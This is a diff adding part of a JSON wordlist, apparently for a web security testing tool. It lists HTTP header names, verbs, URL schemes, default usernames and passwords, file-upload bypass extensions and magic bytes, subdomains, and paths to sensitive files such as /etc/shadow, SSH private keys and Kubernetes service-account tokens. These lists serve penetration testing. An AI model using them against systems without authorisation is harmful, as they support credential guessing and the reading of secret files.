+                "Case-Files",
+                "Catalog",
+                "Catalog-Server",
+                "Category",
+                "Cert-Cookie",
+                "Cert-Flags",
+                "Cert-Issuer",
+                "Cert-Keysize",
+                "Cert-Secretkeysize",
+                "Cert-Serialnumber",
+                "Cert-Server-Issuer",
+                "Cert-Server-Subject",
+                "Cert-Subject",
+                "Cf-Connecting-Ip",
+                "Cf-Ipcountry",
+                "Cf-Template-Path",
+                "Cf-Visitor",
+                "Ch",
+                "Challenge-Response",
+                "Charset",
+                "Chunk-Size",
+                "Client",
+                "Client-Address",
+                "Client-Bad-Request",
+                "Client-Conflict",
+                "Client-Error-Cannot-Access-Local-File",
+                "Client-Error-Cannot-Connect",
+                "Client-Error-Communication-Failure",
+                "Client-Error-Connect",
+                "Client-Error-Invalid-Parameters",
+                "Client-Error-Invalid-Server-Address",
+                "Client-Error-No-Error",
+                "Client-Error-Protocol-Failure",
+                "Client-Error-Unspecified-Error",
+                "Client-Expectation-Failed",
+                "Client-Forbidden",
+                "Client-Gone",
+                "Client-Ip",
+                "Client-IP",
+                "Client-Length-Required",
+                "Client-Method-Not-Allowed",
+                "Client-Not-Acceptable",
+                "Client-Not-Found",
+                "Client-Payment-Required",
+                "Client-Precondition-Failed",
+                "Client-Proxy-Auth-Required",
+                "Client-Quirk-Mode",
+                "Client-Request-Timeout",
+                "Client-Request-Too-Large",
+                "Client-Request-Uri-Too-Large",
+                "Client-Requested-Range-Not-Possible",
+                "Client-Unauthorized",
+                "Client-Unsupported-Media-Type",
+                "Clientaddress",
+                "Clientip",
+                "Cloudfront-Viewer-Country",
+                "Cloudinary-Name",
+                "Cloudinary-Public-Id",
+                "Cloudinary-Version",
+                "Cloudinaryurl",
+                "Cluster-Client-IP",
+                "Code",
+                "Coming-From",
+                "Compress",
+                "Conflict",
+                "Connection",
+                "Connection-Type",
+                "Contact",
+                "Content",
+                "Content-Disposition",
+                "Content-Encoding",
+                "Content-Language",
+                "Content-Length",
+                "Content-Location",
+                "Content-MD5",
+                "Content-Md5",
+                "Content-Range",
+                "Content-Security-Policy",
+                "Content-Security-Policy-Report-Only",
+                "Content-Type",
+                "Content-Type-Xhtml",
+                "Context-Path",
+                "Continue",
+                "Cookie",
+                "Cookie-Domain",
+                "Cookie-Httponly",
+                "Cookie-Parse-Raw",
+                "Cookie-Path",
+                "Cookie-Secure",
+                "Cookie-Vars",
+                "Cookie2",
+                "Cookies",
+                "Core-Base",
+                "Correlates",
+                "Created",
+                "Credentials-Filepath",
+                "Curl",
+                "Curl-Multithreaded",
+                "Custom-Header",
+                "Custom-Secret-Header",
+                "Dataserviceversion",
+                "Date",
+                "Debug",
+                "Deflate-Level-Def",
+                "Deflate-Level-Max",
+                "Deflate-Level-Min",
+                "Deflate-Strategy-Def",
+                "Deflate-Strategy-Filt",
+                "Deflate-Strategy-Fixed",
+                "Deflate-Strategy-Huff",
+                "Deflate-Strategy-Rle",
+                "Deflate-Type-Gzip",
+                "Deflate-Type-Raw",
+                "Deflate-Type-Zlib",
+                "Delete",
+                "Depth",
+                "Destination",
+                "Destroy",
+                "Devblocksproxybase",
+                "Devblocksproxyhost",
+                "Devblocksproxyssl",
+                "Device-Stock-Ua",
+                "Digest",
+                "Dir",
+                "Dir-Name",
+                "Dir-Resource",
+                "Disable-Gzip",
+                "Dkim-Signature",
+                "DNT",
+                "Dnt",
+                "Download-Attachment",
+                "Download-Bad-Url",
+                "Download-Bz2",
+                "Download-Cut-Short",
+                "Download-E-Headers-Sent",
+                "Download-E-Invalid-Archive-Type",
+                "Download-E-Invalid-Content-Type",
+                "Download-E-Invalid-File",
+                "Download-E-Invalid-Param",
+                "Download-E-Invalid-Request",
+                "Download-E-Invalid-Resource",
+                "Download-E-No-Ext-Mmagic",
+                "Download-E-No-Ext-Zlib",
+                "Download-Inline",
+                "Download-Mime-Type",
+                "Download-No-Server",
+                "Download-Size",
+                "Download-Status-Not-Found",
+                "Download-Status-Server-Error",
+                "Download-Status-Unauthorized",
+                "Download-Status-Unknown",
+                "Download-Tar",
+                "Download-Tgz",
+                "Download-Url",
+                "Download-Zip",
+                "E-Encoding",
+                "E-Header",
+                "E-Invalid-Param",
+                "E-Malformed-Headers",
+                "E-Message-Type",
+                "E-Querystring",
+                "E-Request",
+                "E-Request-Method",
+                "E-Request-Pool",
+                "E-Response",
+                "E-Runtime",
+                "E-Socket",
+                "E-Url",
+                "Enable-Gzip",
+                "Enable-No-Cache-Headers",
+                "Encoding-Stream-Flush-Full",
+                "Encoding-Stream-Flush-None",
+                "Encoding-Stream-Flush-Sync",
+                "Env-Silla-Environment",
+                "Env-Vars",
+                "Error",
+                "Error-1",
+                "Error-2",
+                "Error-3",
+                "Error-4",
+                "Error-Formatting-Html",
+                "Espo-Authorization",
+                "Espo-Cgi-Auth",
+                "Etag",
+                "Eve-Charid",
+                "Eve-Charname",
+                "Eve-Solarsystemid",
+                "Eve-Solarsystemname",
+                "Eve-Trusted",
+                "Ex-Copy-Movie",
+                "Expect",
+                "Expectation-Failed",
+                "Expires",
+                "Ext",
+                "Failed-Dependency",
+                "Fake-Header",
+                "Fastly-Client-Ip",
+                "Fb-Appid",
+                "Fb-Secret",
+                "File-Not-Found",
+                "Filename",
+                "Files",
+                "Files-Vars",
+                "Fire-Breathing-Dragon",
+                "Foo",
+                "Foo-Bar",
+                "Forbidden",
+                "Force-Language",
+                "Force-Local-Xhprof",
+                "Format",
+                "Forwarded",
+                "Forwarded-For",
+                "Forwarded-For-Ip",
+                "Forwarded-Proto",
+                "From",
+                "Fromlink",
+                "Front-End-Https",
+                "Gateway-Interface",
+                "Gateway-Time-Out",
+                "Get",
+                "Get-Vars",
+                "Givenname",
+                "Global-All",
+                "Global-Cookie",
+                "Global-Get",
+                "Global-Post",
+                "Gone",
+                "Google-Code-Project-Hosting-Hook-Hmac",
+                "Gzip-Level",
+                "H0st",
+                "Head",
+                "Header",
+                "Header-Lf",
+                "Header-Status-Client-Error",
+                "Header-Status-Informational",
+                "Header-Status-Redirect",
+                "Header-Status-Server-Error",
+                "Header-Status-Successful",
+                "Home",
+                "Host",
+                "Host-Liveserver",
+                "Host-Name",
+                "Host-Unavailable",
+                "Hosti",
+                "Htaccess",
+                "Http-Accept",
+                "Http-Accept-Encoding",
+                "Http-Accept-Language",
+                "Http-Authorization",
+                "Http-Connection",
+                "Http-Cookie",
+                "Http-Host",
+                "Http-Phone-Number",
+                "Http-Referer",
+                "Http-Url",
+                "Http-User-Agent",
+                "HTTP2-Settings",
+                "Https",
+                "Https-From-Lb",
+                "Https-Keysize",
+                "Https-Secretkeysize",
+                "Https-Server-Issuer",
+                "Https-Server-Subject",
+                "If",
+                "If-Match",
+                "If-Modified-Since",
+                "If-Modified-Since-Version",
+                "If-None-Match",
+                "If-Posted-Before",
+                "If-Range",
+                "If-Unmodified-Since",
+                "If-Unmodified-Since-Version",
+                "Image",
+                "Images",
+                "Incap-Client-Ip",
+                "Info",
+                "Info-Download-Size",
+                "Info-Download-Time",
+                "Info-Return-Code",
+                "Info-Total-Request-Stat",
+                "Info-Total-Response-Stat",
+                "Insufficient-Storage",
+                "Internal-Server-Error",
+                "Ipresolve-Any",
+                "Ipresolve-V4",
+                "Ipresolve-V6",
+                "Ischedule-Version",
+                "Iv-Groups",
+                "Iv-User",
+                "Javascript",
+                "Jenkins",
+                "Keep-Alive",
+                "Kiss-Rpc",
+                "Label",
+                "Large-Allocation",
+                "Last-Event-Id",
+                "Last-Modified",
+                "Length-Required",
+                "Link",
+                "Local-Addr",
+                "Local-Content-Sha1",
+                "Local-Dir",
+                "Location",
+                "Lock-Token",
+                "Locked",
+                "Mail",
+                "Mandatory",
+                "Max-Conn",
+                "Max-Forwards",
+                "Max-Request-Size",
+                "Max-Uri-Length",
+                "Maxdataserviceversion",
+                "Message",
+                "Message-B",
+                "Meth-Acl",
+                "Meth-Baseline-Control",
+                "Meth-Checkin",
+                "Meth-Checkout",
+                "Meth-Connect",
+                "Meth-Copy",
+                "Meth-Delete",
+                "Meth-Get",
+                "Meth-Head",
+                "Meth-Label",
+                "Meth-Lock",
+                "Meth-Merge",
+                "Meth-Mkactivity",
+                "Meth-Mkcol",
+                "Meth-Mkworkspace",
+                "Meth-Move",
+                "Meth-Options",
+                "Meth-Post",
+                "Meth-Propfind",
+                "Meth-Proppatch",
+                "Meth-Put",
+                "Meth-Report",
+                "Meth-Trace",
+                "Meth-Uncheckout",
+                "Meth-Unlock",
+                "Meth-Update",
+                "Meth-Version-Control",
+                "Method",
+                "Method-Not-Allowed",
+                "Mimetype",
+                "Mod-Env",
+                "Mod-Rewrite",
+                "Mod-Security-Message",
+                "Modauth",
+                "Mode",
+                "Module-Class",
+                "Module-Class-Path",
+                "Module-Name",
+                "Moved-Permanently",
+                "Moved-Temporarily",
+                "Ms-Asprotocolversion",
+                "Msg-None",
+                "Msg-Request",
+                "Msg-Response",
+                "Msisdn",
+                "Multi-Status",
+                "Multipart-Boundary",
+                "Multiple-Choices",
+                "Must",
+                "My-Header",
+                "Mysqlport",
+                "Native-Sockets",
+                "Negotiate",
+                "Nl",
+                "No-Content",
+                "Non-Authoritative",
+                "Nonce",
+                "Not-Acceptable",
+                "Not-Exists",
+                "Not-Extended",
+                "Not-Found",
+                "Not-Implemented",
+                "Not-Modified",
+                "Notification-Template",
+                "Oc-Chunked",
+                "Ocs-Apirequest",
+                "Ok",
+                "On-Behalf-Of",
+                "Onerror-Continue",
+                "Onerror-Die",
+                "Onerror-Return",
+                "Only",
+                "Opencart",
+                "Options",
+                "Organizer",
+                "Orig_path_info",
+                "Origin",
+                "Originator",
+                "Overwrite",
+                "Params-Allow-Comma",
+                "Params-Allow-Failure",
+                "Params-Default",
+                "Params-Get-Catid",
+                "Params-Get-Currentday",
+                "Params-Get-Disposition",
+                "Params-Get-Downwards",
+                "Params-Get-Givendate",
+                "Params-Get-Lang",
+                "Params-Get-Type",
+                "Params-Raise-Error",
+                "Partial-Content",
+                "Passkey",
+                "Password",
+                "Path",
+                "Path-Base",
+                "Path-Info",
+                "Path-Themes",
+                "Path-Translated",
+                "Payment-Required",
+                "Pc-Remote-Addr",
+                "Permanent",
+                "Phone-Number",
+                "Php",
+                "Php-Auth-Pw",
+                "Php-Auth-User",
+                "Phpthreads",
+                "Pink-Pony",
+                "Port",
+                "Portsensor-Auth",
+                "Post",
+                "Post-Error",
+                "Post-Files",
+                "Post-Vars",
+                "Postredir-301",
+                "Postredir-302",
+                "Postredir-All",
+                "Pragma",
+                "Pragma-No-Cache",
+                "Precondition-Failed",
+                "Prefer",
+                "Processing",
+                "Profile",
+                "Protocol",
+                "Protocols",
+                "Proxy",
+                "Proxy-Agent",
+                "Proxy-Authenticate",
+                "Proxy-Authentication-Required",
+                "Proxy-Authorization",
+                "Proxy-Connection",
+                "Proxy-Host",
+                "Proxy-Http",
+                "Proxy-Http-1-0",
+                "Proxy-Password",
+                "Proxy-Port",
+                "Proxy-Pwd",
+                "Proxy-Request-Fulluri",
+                "Proxy-Socks4",
+                "Proxy-Socks4a",
+                "Proxy-Socks5",
+                "Proxy-Socks5-Hostname",
+                "Proxy-Url",
+                "Proxy-User",
+                "Public-Key-Pins",
+                "Public-Key-Pins-Report-Only",
+                "Pull",
+                "Put",
+                "Query-String",
+                "Querystring",
+                "Querystring-Type-Array",
+                "Querystring-Type-Bool",
+                "Querystring-Type-Float",
+                "Querystring-Type-Int",
+                "Querystring-Type-Object",
+                "Querystring-Type-String",
+                "Range",
+                "Range-Not-Satisfiable",
+                "Raw-Post-Data",
+                "Read-State-Begin",
+                "Read-State-Body",
+                "Read-State-Headers",
+                "Real-Ip",
+                "Real-Method",
+                "Reason",
+                "Reason-Phrase",
+                "Recipient",
+                "Redirect",
+                "Redirect-Found",
+                "Redirect-Perm",
+                "Redirect-Post",
+                "Redirect-Problem-Withoutwww",
+                "Redirect-Problem-Withwww",
+                "Redirect-Proxy",
+                "Redirect-Temp",
+                "Redirected-Accept-Language",
+                "Redirection-Found",
+                "Redirection-Multiple-Choices",
+                "Redirection-Not-Modified",
+                "Redirection-Permanent",
+                "Redirection-See-Other",
+                "Redirection-Temporary",
+                "Redirection-Unused",
+                "Redirection-Use-Proxy",
+                "Ref",
+                "Referer",
+                "Referrer",
+                "Referrer-Policy",
+                "Refferer",
+                "Refresh",
+                "Remix-Hash",
+                "Remote-Addr",
+                "Remote-Host",
+                "Remote-Host-Wp",
+                "Remote-User",
+                "Remote-Userhttps",
+                "Report-To",
+                "Request",
+                "Request-Entity-Too-Large",
+                "Request-Error",
+                "Request-Error-File",
+                "Request-Error-Gzip-Crc",
+                "Request-Error-Gzip-Data",
+                "Request-Error-Gzip-Method",
+                "Request-Error-Gzip-Read",
+                "Request-Error-Proxy",
+                "Request-Error-Redirects",
+                "Request-Error-Response",
+                "Request-Error-Url",
+                "Request-Http-Ver-1-0",
+                "Request-Http-Ver-1-1",
+                "Request-Mbstring",
+                "Request-Method",
+                "Request-Method-Delete",
+                "Request-Method-Get",
+                "Request-Method-Head",
+                "Request-Method-Options",
+                "Request-Method-Post",
+                "Request-Method-Put",
+                "Request-Method-Trace",
+                "Request-Time-Out",
+                "Request-Timeout",
+                "Request-Uri",
+                "Request-Uri-Too-Large",
+                "Request-Vars",
+                "Request2-Tests-Base-Url",
+                "Request2-Tests-Proxy-Host",
+                "Requesttoken",
+                "Reset-Content",
+                "Response",
+                "Rest-Key",
+                "Rest-Sign",
+                "Retry-After",
+                "Returned-Error",
+                "Rlnclientipaddr",
+                "Root",
+                "Safe-Ports-List",
+                "Safe-Ports-Ssl-List",
+                "Save-Data",
+                "Schedule-Reply",
+                "Scheme",
+                "Script-Name",
+                "Sec-Websocket-Accept",
+                "Sec-Websocket-Extensions",
+                "Sec-Websocket-Key",
+                "Sec-Websocket-Key1",
+                "Sec-Websocket-Key2",
+                "Sec-Websocket-Origin",
+                "Sec-Websocket-Protocol",
+                "Sec-Websocket-Version",
+                "Secretkey",
+                "See-Other",
+                "Self",
+                "Send-X-Frame-Options",
+                "Server",
+                "Server-Bad-Gateway",
+                "Server-Error",
+                "Server-Gateway-Timeout",
+                "Server-Internal",
+                "Server-Name",
+                "Server-Not-Implemented",
+                "Server-Port",
+                "Server-Port-Secure",
+                "Server-Protocol",
+                "Server-Service-Unavailable",
+                "Server-Software",
+                "Server-Unsupported-Version",
+                "Server-Vars",
+                "Server-Varsabantecart",
+                "Service-Unavailable",
+                "Session-Id-Tag",
+                "Session-Vars",
+                "Set-Cookie",
+                "Set-Cookie2",
+                "Shib-Application-Id",
+                "Shib-Identity-Provider",
+                "Shib-Logouturl",
+                "Shopilex",
+                "Slug",
+                "Sn",
+                "Soapaction",
+                "Socket-Connection-Err",
+                "Socketlog",
+                "Somevar",
+                "Sourcemap",
+                "Sp-Client",
+                "Sp-Host",
+                "Ssl",
+                "Ssl-Https",
+                "Ssl-Offloaded",
+                "Ssl-Session-Id",
+                "Ssl-Version-Any",
+                "Sslsessionid",
+                "Start",
+                "Status",
+                "Status-403",
+                "Status-403-Admin-Del",
+                "Status-404",
+                "Status-Bad-Request",
+                "Status-Code",
+                "Status-Forbidden",
+                "Status-Ok",
+                "Status-Platform-403",
+                "Str-Match",
+                "Strict-Transport-Security",
+                "Success-Accepted",
+                "Success-Created",
+                "Success-No-Content",
+                "Success-Non-Authoritative",
+                "Success-Ok",
+                "Success-Partial-Content",
+                "Success-Reset-Content",
+                "Support",
+                "Support-Encodings",
+                "Support-Events",
+                "Support-Magicmime",
+                "Support-Requests",
+                "Support-Sslrequests",
+                "Surrogate-Capability",
+                "Switching-Protocols",
+
+
+                "TE",
+                "Te",
+                "Ticket",
+                "Time-Out",
+                "Timeout",
+                "Timing-Allow-Origin",
+                "Token",
+                "Trailer",
+                "Transfer-Encoding",
+                "Translate",
+                "True-Client-Ip",
+                "True-Client-IP",
+                "Upgrade",
+                "Upgrade-Insecure-Requests",
+                "Upgrade-Required",
+                "Uri",
+                "Url",
+                "Url-From-Env",
+                "Url-Join-Path",
+                "Url-Join-Query",
+                "Url-Replace",
+                "Url-Sanitize-Path",
+                "Use-Gzip",
+                "Use-Proxy",
+                "User",
+                "User-Agent",
+                "User-Agent-Via",
+                "User-Email",
+                "User-Id",
+                "User-Mail",
+                "User-Name",
+                "User-Photos",
+                "Useragent",
+                "Useragent-Via",
+                "Vary",
+                "Verbose",
+                "Version",
+                "Via",
+                "Wap-Connection",
+                "Www-Address",
+                "Www-Authenticate",
+                "X-Access-Token",
+                "X-Api-Key",
+                "X-Api-Signature",
+                "X-Api-Timestamp",
+                "X-Apitoken",
+                "X-Auth-Key",
+                "X-Auth-Mode",
+                "X-Auth-Password",
+                "X-Auth-Service-Provider",
+                "X-Auth-Token",
+                "X-Auth-User",
+                "X-Auth-Userid",
+                "X-Auth-Username",
+                "X-Authentication",
+                "X-Authentication-Key",
+                "X-Authorization",
+                "X-Browser-Height",
+                "X-Browser-Width",
+                "X-Cascade",
+                "X-Cf-Url",
+                "X-Chrome-Extension",
+                "X-Client-Host",
+                "X-Client-Id",
+                "X-Client-Ip",
+                "X-Client-IP",
+                "X-Client-Key",
+                "X-Client-Os",
+                "X-Client-Os-Ver",
+                "X-Clientip",
+                "X-Cluster-Client-Ip",
+                "X-Confirm-Delete",
+                "X-Content-Type",
+                "X-Content-Type-Options",
+                "X-Correlation-ID",
+                "X-Credentials-Request",
+                "X-Csrf-Crumb",
+                "X-Csrf-Token",
+                "X-Csrftoken",
+                "X-Custom",
+                "X-Debug-Test",
+                "X-Device-User-Agent",
+                "X-Dialog",
+                "X-Dns-Prefetch-Control",
+                "X-Do-Not-Track",
+                "X-Environment-Override",
+                "X-File-Id",
+                "X-File-Name",
+                "X-File-Resume",
+                "X-File-Size",
+                "X-File-Type",
+                "X-Filename",
+                "X-Flash-Version",
+                "X-Foo",
+                "X-Foo-Bar",
+                "X-Forward-For",
+                "X-Forward-Proto",
+                "X-Forwarded",
+                "X-Forwarded-By",
+                "X-Forwarded-For",
+                "X-Forwarded-For-Original",
+                "X-Forwarded-Host",
+                "X-Forwarded-Port",
+                "X-Forwarded-Proto",
+                "X-Forwarded-Protocol",
+                "X-Forwarded-Scheme",
+                "X-Forwarded-Server",
+                "X-Forwarded-Ssl",
+                "X-Forwarder-For",
+                "X-From",
+                "X-Geoip-Country",
+                "X-Get-Checksum",
+                "X-Host",
+                "X-Http-Destinationurl",
+                "X-Http-Host-Override",
+                "X-Http-Method",
+                "X-Http-Method-Override",
+                "X-Http-Path-Override",
+                "X-Https",
+                "X-If-Unmodified-Since",
+                "X-Ip",
+                "X-Json",
+                "X-Locking",
+                "X-Machine",
+                "X-Mandrill-Signature",
+                "X-Method-Override",
+                "X-Mobile-Gateway",
+                "X-Mobile-Ua",
+                "X-Moz",
+                "X-Ms-Policykey",
+                "X-Network-Info",
+                "X-Options",
+                "X-Orig-Client",
+                "X-Original-Host",
+                "X-Original-Http-Command",
+                "X-Original-Remote-Addr",
+                "X-Original-Url",
+                "X-Original-User-Agent",
+                "X-Originally-Forwarded-For",
+                "X-Originally-Forwarded-Proto",
+                "X-Originating-Ip",
+                "X-Originating-IP",
+                "X-Password",
+                "X-Prototype-Version",
+                "X-Proxy-Url",
+                "X-Pswd",
+                "X-Purpose",
+                "X-Real-Ip",
+                "X-Remote-Addr",
+                "X-Remote-IP",
+                "X-Remote-Protocol",
+                "X-Render-Partial",
+                "X-Request",
+                "X-Request-ID",
+                "X-Request-Id",
+                "X-Request-Signature",
+                "X-Request-Start",
+                "X-Request-Timestamp",
+                "X-Requested-With",
+                "X-Response-Format",
+                "X-Rest-Cors",
+                "X-Rest-Password",
+                "X-Rest-Username",
+                "X-Rewrite-Url",
+                "X-Scanner",
+                "X-Scheme",
+                "X-Screen-Height",
+                "X-Screen-Width",
+                "X-Sendfile-Type",
+                "X-Serial-Number",
+                "X-Serialize",
+                "X-Server-Id",
+                "X-Server-Name",
+                "X-Server-Port",
+                "X-Signature",
+                "X-Ssl",
+                "X-Subdomain",
+                "X-Timer",
+                "X-Tomboy-Client",
+                "X-Tor",
+                "X-Twilio-Signature",
+                "X-Ua-Device",
+                "X-Update",
+                "X-Update-Range",
+                "X-Upload-Maxresolution",
+                "X-Upload-Name",
+                "X-Upload-Size",
+                "X-Upload-Type",
+                "X-Url-Scheme",
+                "X-User",
+                "X-User-Agent",
+                "X-Username",
+                "X-Varnish",
+                "X-Wap-Client-Sdu-Size",
+                "X-Wap-Clientid",
+                "X-Wap-Gateway",
+                "X-Wap-Profile",
+                "X-Wap-Proxy-Cookie",
+                "X-Wap-Session-Id",
+                "X-Wikimedia-Debug",
+                "X-Wp-Nonce",
+                "X-Wp-Pjax-Prefetch",
+                "X-Ws-Api-Key",
+                "X-Xc-Schema-Version",
+                "X-Xhprof-Debug",
+                "X-Xhr-Referer",
+                "X-Xmlhttprequest",
+                "X-Xpid",
+                "Accept-Patch",
+                "Alt-Svc",
+                "ETag",
+                "IM",
+                "P3P",
+                "WWW-Authenticate",
+                "X-Frame-Options",
+                "X-HTTP-Method-Override",
+                "x-wap-profile",
+                "Cross-Origin-Resource-Policy",
+                "Expect-CT",
+                "Feature-Policy",
+                "Sec-Fetch-Dest",
+                "Sec-Fetch-Mode",
+                "Sec-Fetch-Site",
+                "Sec-Fetch-User",
+                "Sec-WebSocket-Accept"
+            ]
+        },
+        {
+            "name": "Hackvertor",
+            "values": [
+                "<@urlencode><@/urlencode>",
+                "<@base64><@/base64>"
+            ]
+        },
+        {
+            "name": "UUID",
+            "values": [
+                "00000000-0000-0000-0000-000000000000",
+                "11111111-1111-1111-1111-111111111111"
+            ]
+        },
+        {
+            "name": "HTTP Verbs",
+            "values": [
+                "OPTIONS",
+                "GET",
+                "HEAD",
+                "POST",
+                "PUT",
+                "DELETE",
+                "TRACE",
+                "CONNECT",
+                "PROPFIND",
+                "PROPPATCH",
+                "MKCOL",
+                "COPY",
+                "MOVE",
+                "LOCK",
+                "UNLOCK",
+                "VERSION-CONTROL",
+                "REPORT",
+                "CHECKOUT",
+                "CHECKIN",
+                "UNCHECKOUT",
+                "MKWORKSPACE",
+                "UPDATE",
+                "LABEL",
+                "MERGE",
+                "BASELINE-CONTROL",
+                "MKACTIVITY",
+                "ORDERPATCH",
+                "ACL",
+                "PATCH",
+                "SEARCH",
+                "ARBITRARY",
+                "options",
+                "get",
+                "head",
+                "post",
+                "put",
+                "delete",
+                "trace",
+                "connect",
+                "propfind",
+                "proppatch",
+                "mkcol",
+                "copy",
+                "move",
+                "lock",
+                "unlock",
+                "version-control",
+                "report",
+                "checkout",
+                "checkin",
+                "uncheckout",
+                "mkworkspace",
+                "update",
+                "label",
+                "merge",
+                "baseline-control",
+                "mkactivity",
+                "orderpatch",
+                "acl",
+                "patch",
+                "search",
+                "arbitrary"
+            ]
+        },
+        {
+            "name": "Protocols",
+            "values": [
+                "dict://",
+                "file://",
+                "ftp://",
+                "ftps://",
+                "gopher://",
+                "http://",
+                "https://",
+                "imap://",
+                "imaps://",
+                "ldap://",
+                "ldaps://",
+                "pop3://",
+                "pop3s://",
+                "rtmp://",
+                "rtmpe://",
+                "rtmps://",
+                "rtmpt://",
+                "rtmpte://",
+                "rtmpts://",
+                "rtsp://",
+                "scp://",
+                "sftp://",
+                "smb://",
+                "smbs://",
+                "smtp://",
+                "smtps://",
+                "telnet://",
+                "tftp://"
+            ]
+        },
+        {
+            "name": "Content-Type",
+            "values": [
+                
+                "application/x-shockwave-flash",
+                "application/pdf",
+                "application/atom+xml",
+                "application/octet-stream",
+                "image/bmp",
+                "application/x-bzip",
+                "application/x-bzip2",
+                "text/css",
+                "text/csv",
+                "application/x-debian-package",
+                "application/xml-dtd",
+                "application/ecmascript",
+                "image/gif",
+                "text/html",
+                "text/calendar",
+                "image/x-icon",
+                "application/javascript",
+                "application/json",
+                "image/jpeg",
+                "application/mbox",
+                "audio/mpeg",
+                "video/mpeg",
+                "audio/mp4",
+                "video/mp4",
+                "application/mp4",
+                "application/ogg",
+                "audio/ogg",
+                "video/ogg",
+                "audio/webm",
+                "video/webm",
+                "image/png",
+                "application/postscript",
+                "video/quicktime",
+                "application/rtf",
+                "text/richtext",
+                "image/svg+xml",
+                "image/tiff",
+                "text/plain",
+                "text/x-uuencode",
+                "text/x-vcalendar",
+                "text/x-vcard",
+                "image/webp",
+                "application/wsdl+xml",
+                "application/xhtml+xml",
+                "text/yaml",
+                "application/zip"
+            ]
+        },
+        {
+            "name": "Session cookie",
+            "values": [
+                "ASP.NET_SessionId",
+                "ASPSESSIONID",
+                "SITESERVER",
+                "cfid",
+                "cftoken",
+                "jsessionid",
+                "sessid",
+                "sid",
+                "viewstate",
+                "zenid",
+                "PHPSESSID"
+            ]
+        },
+        {
+            "name": "Usernames",
+            "values": [
+                "root",
+                "admin",
+                "test",
+                "guest",
+                "info",
+                "adm",
+                "mysql",
+                "user",
+                "administrator",
+                "oracle",
+                "ftp",
+                "manager",
+                "operator",
+                "supervisor",
+                "debug"
+            ]
+        },
+        {
+            "name": "Passwords",
+            "values": [
+                "password",
+                "admin",
+                "manager",
+                "test",
+                "guest",
+                "1234",
+                "azerty",
+                "qwerty",
+                "Passw0rd!",
+                "cisco",
+                "root",
+                "debug"
+            ]
+        },
+        {
+            "name": "Dependencies",
+            "values": [
+                "package.json",
+                "composer.json",
+                "requirements.txt",
+                "pom.xml"
+            ]
+        },
+        {
+            "name": "Magic Bytes",
+            "values": [
+                "\\xff\\xd8\\xff",
+                "\\x89PNG\\r\\n\\x1a\\n\\0\\0\\0\\rIHDR\\0\\0\\x03H\\0\\xs0\\x03[",
+                "GIF87a",
+                "GIF87a",
+                "GIF8;"
+            ]
+        },
+        {
+            "name": "Extensions",
+            "values": [
+                ".php",
+                ".php3",
+                ".php4",
+                ".php5",
+                ".php7",
+                ".pht",
+                ".phps",
+                ".phar",
+                ".phpt",
+                ".pgif",
+                ".phtml",
+                ".phtm",
+                ".inc",
+                ".asp",
+                ".aspx",
+                ".cer",
+                ".soap",
+                ".asa",
+                ".jsp",
+                ".jspx",
+                ".jsw",
+                ".jsv",
+                ".jspf"
+            ]
+        },
+        {
+            "name": "Files",
+            "values": [
+                "/etc/issue",
+                "/etc/passwd",
+                "/etc/shadow",
+                "/etc/group",
+                "/etc/hosts",
+                "/etc/motd",
+                "/etc/mysql/my.cnf",
+                "/proc/self/environ",
+                "/proc/version",
+                "/proc/cmdline",
+                "/proc/sched_debug",
+                "/proc/mounts",
+                "/proc/net/arp",
+                "/proc/net/route",
+                "/proc/net/tcp",
+                "/proc/net/udp",
+                "/proc/self/cwd/index.php",
+                "/proc/self/cwd/main.py",
+                "/home/$USER/.bash_history",
+                "/home/$USER/.ssh/id_rsa",
+                "/run/secrets/kubernetes.io/serviceaccount/token",
+                "/run/secrets/kubernetes.io/serviceaccount/namespace",
+                "/run/secrets/kubernetes.io/serviceaccount/certificate",
+                "/var/run/secrets/kubernetes.io/serviceaccount",
+                "/var/lib/mlocate/mlocate.db",
+                "/var/lib/mlocate.db",
+                "c:/boot.ini",
+                "c:/inetpub/logs/logfiles",
+                "c:/inetpub/wwwroot/global.asa",
+                "c:/inetpub/wwwroot/index.asp",
+                "c:/inetpub/wwwroot/web.config",
+                "c:/sysprep.inf",
+                "c:/sysprep.xml",
+                "c:/sysprep/sysprep.inf",
+                "c:/sysprep/sysprep.xml",
+                "c:/system32/inetsrv/metabase.xml",
+                "c:/sysprep.inf",
+                "c:/sysprep.xml",
+                "c:/sysprep/sysprep.inf",
+                "c:/sysprep/sysprep.xml",
+                "c:/system volume information/wpsettings.dat",
+                "c:/system32/inetsrv/metabase.xml",
+                "c:/unattend.txt",
+                "c:/unattend.xml",
+                "c:/unattended.txt",
+                "c:/unattended.xml",
+                "c:/windows/repair/sam",
+                "c:/windows/repair/system",
+                "/var/log/apache/access.log",
+                "/var/log/apache/error.log",
+                "/var/log/httpd/error_log",
+                "/usr/local/apache/log/error_log",
+                "/usr/local/apache2/log/error_log",
+                "/var/log/nginx/access.log",
+                "/var/log/nginx/error.log",
+                "/var/log/vsftpd.log",
+                "/var/log/sshd.log",
+                "/var/log/mail"
+            ]
+        },
+        {
+            "name": "Subdomains",
+            "values": [
+                "www",
+                "mail",
+                "ftp",
+                "localhost",
+                "webmail",
+                "smtp",
+                "pop",
+                "ns1",
+                "webdisk",
+                "ns2",
+                "cpanel",
+                "whm",
+                "autodiscover",
+                "autoconfig",
+                "m",
+                "imap",
+                "test",
+                "ns",
+                "blog",
+                "pop3",
+                "dev",
+                "www2",
+                "admin",
+                "forum",
+                "news",
+                "vpn",
+                "ns3",
+                "mail2",
+                "new",
+                "mysql",
+                "old",
+                "lists",
+                "support",
+                "mobile",
+                "mx",
+                "static",
+                "docs",
+                "beta",
+                "shop",
+                "sql",
+                "secure",
+                "demo",
+                "cp",
+                "calendar",
+                "wiki",
+                "web",
+                "media",
+                "email",
+                "images",
+                "img",
+                "www1",
+                "intranet",
+                "portal",
+                "video",
+                "sip",
+                "dns2",
+                "api",
+                "cdn",
+                "stats",
+                "dns1",
+                "ns4",
+                "www3",
+                "dns",
+                "search",
+                "staging",
+                "server",
+                "mx1",
+                "chat",
+                "wap",
+                "my",
+                "svn",
+                "mail1",
+                "sites",
+                "proxy",
+                "ads",
+                "host",
+                "crm",
+                "cms",
+                "backup",
+                "mx2",
+                "lyncdiscover",
+                "info",
+                "apps",
+                "download",
+                "remote",
+                "db",
+                "forums",
+                "store",
+                "relay",
+                "files",
+                "newsletter",
+                "app",
+                "live",
+                "owa",
+                "en",
+                "start",
+                "sms",
+                "office",
+                "exchange",
+                "ipv4"
+            ]
+        }
+    ]
+}
